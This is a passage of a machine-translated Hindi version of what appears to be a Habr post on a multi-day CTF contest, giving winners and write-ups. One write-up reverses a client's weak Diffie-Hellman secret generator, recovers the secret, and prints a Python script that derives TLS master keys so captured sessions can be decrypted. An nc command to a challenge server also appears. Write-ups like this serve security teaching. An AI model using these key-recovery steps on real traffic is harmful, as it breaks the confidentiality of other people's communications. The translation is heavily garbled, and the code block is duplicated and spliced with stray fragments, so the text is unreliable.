рдХрд┐ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдореИрд▓рд╡реЗрдпрд░ рд╣реИ, рдЗрд╕рдореЗрдВ рдПрдбрдорд┐рди рдПрдбреНрд░реЗрд╕ рд╕реАрд╡рди 0x82C780B2697A0002 (0x82C780B2: 0x7a69 = 178.128.199.130 ZIP133737) рд╣реИред  рдЬрдм рдкреЛрд░реНрдЯ 31337 рд╕реЗ рдЬреБрдбрд╝рд╛, рддреЛ рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рд╕рд░реНрд╡рд░ 3 рдХрдорд╛рдВрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рддрд░реНрдХ рдорд╛рдВрдЧрддреЗ рд╣реИрдВ </p><br><pre> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p>  рд▓реЗрдХрд┐рди рдЗрд╕ рдмрдВрджрд░рдЧрд╛рд╣ рдХреЗ рд╕рд╛рде рдФрд░ рдХреБрдЫ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛, рдФрд░ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рдпрд╣ рдПрдХ рд╡рд┐рдЪрд▓рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдХрд╛рд░реНрдп рдерд╛ред </p><br></li><li><p>  рдЧреНрд░рд╛рд╣рдХ рдХреЛ рдзреНрдпрд╛рди рд╕реЗ рджреЗрдЦрдиреЗ рдХреЗ рдмрд╛рдж, рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдпрд╣ рдПрдХ рдХрд╕реНрдЯрдо рдбрд┐рдлреА-рд╣реЗрд▓рдореИрди рд░рд╣рд╕реНрдп рдЬрдирд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ: </p><br><pre> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p>  рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, рдПрдХ рдЧреБрдкреНрдд (512 рдмрд╛рдЗрдЯреНрд╕) / dev / urandom рд╕реЗ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд░рд╛рдЬреНрдп рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрддред  рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдПрдХ рдЧреБрдкреНрдд рдХрд╛ рдЕрдиреБрд░реЛрдз рдпрд╣рд╛рдВ рдЗрд╕ рддрд░рд╣ рдХреЗ рдЬрд╛рджреВ рд╣реИ: </p><br><pre> <code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  рдПрдХ рд▓рдВрдмреА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд░рд╣рд╕реНрдп 1 рдмрд┐рдЯ рдХреЛ рдмрд╛рдИрдВ рдУрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдЯ 1 рдерд╛, рддреЛ рд╕рдВрдЦреНрдпрд╛ 5 рдЧреИрд░-рд╢реВрдиреНрдп рдмрд┐рдЯреНрд╕ (XOR) рдХреЗ рдирд┐рд░рдВрддрд░ рдкрд░ рд╣реИред </p><br></li></ol><br><p>  Pcap рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП, рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╕рд░реНрд╡рд░ рд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдбрд┐рдлреА-рд╣реЗрд▓рдореИрди рдкреИрд░рд╛рдореАрдЯрд░ рд╕реНрдерд┐рд░ рд╣реИрдВ: </p><br><pre> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p>  рдФрд░ рд╣рд░ рдмрд╛рд░ рдЬрдм рдХреЛрдИ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдбрд┐рдлреА-рд╣реЗрд▓рдореИрди рдХреЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рдЧреБрдкреНрдд рднреЗрдЬрддрд╛ рд╣реИред  рдкрдбрд╝реЛрд╕реА рд╕рддреНрд░реЛрдВ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рднрд╛рдЧреЛрдВ рдХреА рддреБрд▓рдирд╛ рдХрд░рдХреЗ, рдЖрдк рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░рд╣рд╕реНрдп рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рдкреНрд░рддреНрдпреЗрдХ рдХреЗ рд▓рд┐рдП рдмрд╛рдж рдХреЗ рд╕рднреА рд░рд╣рд╕реНрдп: <br>  рдпрджрд┐ рд░рд╣рд╕реНрдп рдХрд╛ рдЙрдЪреНрдЪрддрдо рдмрд┐рдЯ 0 рд╣реИ, рддреЛ рдЕрдЧрд▓реЗ рд╕рддреНрд░ рдореЗрдВ рд░рд╣рд╕реНрдп рдмрд╕ 2 рдЧреБрдирд╛ рдмрдбрд╝рд╛ рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рднрд╛рдЧ рдЪреБрдХрддрд╛ рдореЛрдбреБрд▓реЛ рдкреА рд╣реЛрдЧрд╛ред  рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░рд╣рд╕реНрдп (рдЬреЛ / рджреЗрд╡ / рдЙрд░реБрдЧреНрдореЗ рд╕реЗ рдкрдврд╝рд╛ рдЧрдпрд╛ рдерд╛) рдореЛрдбреБрд▓реЛ рдкреА рдХреЛ рдмрд╣рд╛рд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛: </p><br><pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p>  рдФрд░ рдЗрд╕рд╕реЗ рд╕рднреА рдЕрдиреНрдп рд╕рддреНрд░реЛрдВ рдХреЗ рд▓рд┐рдП рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИред </p><br><p>  рдФрд░ рдпрд╣рд╛рдБ рд╕рдорд╕реНрдпрд╛рдПрдВ рдереАрдВ: <br>  рдП) рд╡рд╛рдЗрдлрд╝рд╢рд╛рд░реНрдХ рдПрд╕рдПрд╕рд╕реА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рдбрд┐рдлреА-рд╣реЗрд▓рдореИрди рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЬрд╛рдирддреЗ рд╣реБрдП, рдФрд░ рдХреЛрдИ рддреИрдпрд╛рд░ рд╕рдорд╛рдзрд╛рди рдирд╣реАрдВ рдереЗред  рдпрд╣ рд╕рд╛рдЭрд╛ рд░рд╣рд╕реНрдп Diffie-Hellman (рдЙрд░реНрдл рдкреВрд░реНрд╡ рд╕рддреНрд░ рд╕реНрд╡рд╛рдореА рдХреБрдВрдЬреА) рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ, рдФрд░ рдпрд╣ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдмрдбрд╝реА рд╕рд╛рдЗрдХрд┐рд▓ рдХреА рдорджрдж рд╕реЗ рдПрдХ рдорд╛рд╕реНрдЯрд░ рдЪрд╛рдмреА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рддреНрд░ (рдирд╣реАрдВ рдмрд╛рдЗрдХ рдПрд╕рдПрд╕рдПрд▓ рдХреЗ рд▓рд┐рдП рд╕реЛрдЪрд╛ рдерд╛)ред  рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдПрдХ SSLKEYLOG рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ (рдкреНрд░рддреНрдпреЗрдХ ssl рд╕рддреНрд░ рдореЗрдВ) рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА, рдЗрд╕реЗ SSL рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдФрд░ рд╕реИрджреНрдзрд╛рдВрддрд┐рдХ рд░реВрдк рд╕реЗ рд▓рд╛рдн рдХреЗ рд▓рд┐рдП рд╡рд╛рдпрд░рд╢рд░реНрдХ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВред </p><br><p>  рд▓реЗрдХрд┐рди рдХреБрдЫ рдФрд░ рд╕рдорд╕реНрдпрд╛рдПрдВ рд╕рд╛рдордиреЗ рдЖрдИрдВ: <br>  рдмреА) PHP рдмрд╣реБрдд рдзреАрдореА рдЧрддрд┐ рд╕реЗ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ ( <code>bcadd</code> , <code>bcpowmod</code> рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ ...), рдореИрдВрдиреЗ рдЗрд╕реЗ рдЕрдЬрдЧрд░ рдореЗрдВ рдлрд┐рд░ рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛ред <br>  рд╕реА) рд╕реВрддреНрд░ рдордиреБрд╖реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡рд╛рдореА рдХреБрдВрдЬреА рдкреВрд░реНрд╡ рд╕реНрд╡рд╛рдореА рдХреБрдВрдЬреА рдкрд░ рдирд╣реАрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрд╛, sortsy ssl рдкреНрд░рджрд░реНрд╢рд┐рдд openssl рдордзреНрдпрд╡рд░реНрддреА рдЧрдгрдирд╛ рдХреЗ рдкрд░рд┐рдгрд╛рдо рднреА рд╡рд┐рдлрд▓ рд░рд╣рд╛ рд╣реИ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдореЗрд╣рдирдд рд╕реЗ рд╕рдордЭрд╛ред  рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдореИрдВрдиреЗ <a href="">рдЗрд╕ рдХреЛрдб</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд╡рд┐рд╡рд░рдг</a> рдФрд░ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреЗ RFC рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛: <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p>  рдирддреАрдЬрддрди, рдЖрдзреЗ рджрд┐рди рдХреЗ рдмрд╛рдж рдореИрдВ рдЗрд╕реЗ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдерд╛ (рдореЗрд░реЗ рд▓рд┐рдП, рдпрд╣ рд╕рд╛рдЗрдХрд┐рд▓ рдХреЗ рдмрд┐рдирд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛): </p><br><pre> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> , рд░рд╛рдЬреНрдп, dh_p) <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> + рдмреАрдЬ, hashlib.sha256) .digest () <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  рдбреА) рд╡рд┐рднрд┐рдиреНрди рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд░реИрдВрдбрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ..., рд╡рд┐рдВрдбрд╕рд░рдХ рд╕рддреНрд░реЛрдВ рд╕реЗ, рд╕реАрдПрд╕рд╡реА рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдФрд░ рд╕реАрдПрд╕рд╡реА рдореЗрдВ "" ... рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛ рдорд┐рд▓рд╛, рдЙрд╕рдХреЗ рд▓рд┐рдП рдХрдЪреНрдЪреЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдореЗрдВ рдЦреЛрдЬ рдХреАред </p><br><p>  рдИ) 4264 рд╕рддреНрд░реЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╡рд╛рдпрд░рд╢рд░реНрдХ рдиреЗ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЧреАрдЧрд╛рдмрд╛рдЗрдЯ рдСрдкрд░реЗрдЯрд┐рд╡ рдЦрд╛рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛ (8 рдЙрд╕рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рдерд╛), рд▓реЗрдХрд┐рди рдХреБрдЫ рднреА рдирд╣реАрдВ, рдЖрдк рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рд╕рдм рдХреБрдЫ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ рдХрдордЬреЛрд░ рд▓реИрдкрдЯреЙрдк рдкрд░ рдирд╣реАрдВред  рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЬрдм http рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ (рдХрд┐рд╕реА рдЪрд┐рддреНрд░ рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯреЗрдб рдЯреБрдХрдбрд╝реЗ) рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рд╡рд╛рдпрд░рд╢рд░реНрдХ рдХреЗрд╡рд▓ рдкрд╣рд▓реА 1000 рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдмрдЪрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЗрд╕рдХреА рд╕рдВрдЦреНрдпрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИред  рдирддреАрдЬрддрди, рдпрд╣ 5 рднрд╛рдЧреЛрдВ рдкреНрд░рддреНрдпреЗрдХ рдореЗрдВ 1000 рдЯреАрд╕реАрдкреА-рд╕рддреНрд░ рдореЗрдВ PCAP рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд░реВрд░реА рд╣реЛ рдЧрдпрд╛ рдерд╛ред  рдкрд░рд┐рдгрд╛рдо рд╕рднреА рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рдмрд╛рдж рдЗрддрдиреА рд╕реБрдВрджрд░ рддрд╕реНрд╡реАрд░ рдереА: </p><br><p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p>  рдХрд╛рд░реНрдп рдХреЛ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдЬреЗрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рднреА рдлрд╛рдЗрд▓реЗрдВ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдВ</a> рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд╣реИрдВ</a> ред </p><br><h2>  рджрд┐рди 5. рд╕рдВрд░рдХреНрд╖рд┐рдд рд╢реЗрд▓ </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>2 рдЬрдЧрд╣</b> </td><td align="center">  <b>рддреАрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  рдЖрдк рдРрд╕рд╛ </td><td align="center">  Bartimaeous </td><td align="center">  CLO </td></tr><tr><td colspan="3" align="center">  рдпрд╣ рднреА рддрдп рдХрд┐рдпрд╛: рдореИрдХреНрд╕рд┐рдо рдкреНрд░реЛрд╡рд┐рди, 0x3c3e, рдЯрд┐рдВрдХрд░рд▓реЙрдХ, рдбреЗрдорд┐рдбреЛрд╡_рд▓, рдПрдХреНрд╕ @ рд╕реЗрдХрдЯрд░, groke_in_the_sky, d3fl4t3 </td></tr></tbody></table></div><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">RuCTFE</a> рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдЯрд╛рд╕реНрдХред  рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ рдХрдИ рдбрд┐рдмрдЧрд┐рдВрдЧ рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рджреА рдЧрдИ рдереАред  рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдПрдХ рдПрд╕рдПрд╕рдПрдЪ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рддрд░рд╣ рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рдЬреНрдЮрд╛рдд рд╕рд░реНрд╡рд░ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реИред  рдХрд╛рд░реНрдп рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдкрд░ рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛ рд╕рдХреЗред  рд▓реЗрдЦрдХ рдХрд╛ рд╕рдорд╛рдзрд╛рди рдбрд┐рдмрдЧрд┐рдВрдЧ рд╡рд┐рд░реЛрдзреА рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдирд╛ рдФрд░ рдЖрдХреНрд╖реЗрдк рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред </p><br><p>  рдпрд╣ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ рдХрд┐ рд╕рдмрд╕реЗ рддреЗрдЬ рдкреНрд░рддрд┐рднрд╛рдЧреА рдиреЗ рд▓реЗрдЦрдХ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпреЛрдЬрд┐рдд рдПрдХ рд╕реЗ рдЕрд▓рдЧ рдореВрд▓ рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рд░реНрдп рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛, рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рдПрдХ рдФрд░ рд╕рдорд╛рдзрд╛рди рдорд┐рд▓рд╛ред  рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЙрд╕рдиреЗ рдиреАрдЪреЗ рд╕реНрдкреЙрдЗрд▓рд░ рдХреЗ рдиреАрдЪреЗ рдХреИрд╕реЗ рдХрд┐рдпрд╛ред </p><br><div class="spoiler">  <b class="spoiler_title">рдкрд╛рдВрдЪрд╡рд╛рдВ рджрд┐рди рдХрд╛рд░реНрдп рд╕рдорд╛рдзрд╛рди рд╡рд┐рдХрд▓реНрдк (vos)</b> <div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2>  рджрд┐рди 6. UNLOCK </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>рджреВрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td><td align="center">  <b>рддреАрд╕рд░рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  gotdaswag </td><td align="center">  medidrdrider </td><td align="center">  sysenter </td></tr></tbody></table></div><br><p>  рдЫрдареЗ рджрд┐рди рдХрд╛ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдХрд╛рд░реНрдпрд╡реГрддреНрдд VolgaCTF</a> рдЯреАрдо рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред  рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП рдЬреЛ рдПрдХ рдХрд╕реНрдЯрдо рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред  рдХрд╛рд░реНрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рджреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ рд╣реИ, рдПрдХ рдЬреНрдЮрд╛рдд рдХреБрдВрдЬреА рдХреЗ рдмрд┐рдирд╛, рдЗрд╕ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред </p><br><div class="spoiler">  <b class="spoiler_title">рдЫрдареЗ рджрд┐рди рдХрд╛ рдХрд╛рд░реНрдп рд╕рдорд╛рдзрд╛рди (рдЧреЗрдЯрд╕реНрд╡рд╛рдЧ)</b> <div class="spoiler_text"><h3 id="intro">  рдкрд░рд┐рдЪрдп </h3><br><p>  рджрд╛рди рджреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ <strong>рд▓реЙрдХрд░</strong> рдФрд░ <strong>secret.png.enc</strong> рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд <strong>рдХрд░реЗрдВред</strong> </p><br><p>  рдкрд╣рд▓реА рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдирдХреНрд╕ x86-64 рдХреЗ рд▓рд┐рдП рдПрдХ <strong>рдИрдПрд▓рдПрдл рд╣реИ</strong> , рдЬреЛ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдФрд░ рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ рджреВрд╕рд░рд╛ рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб 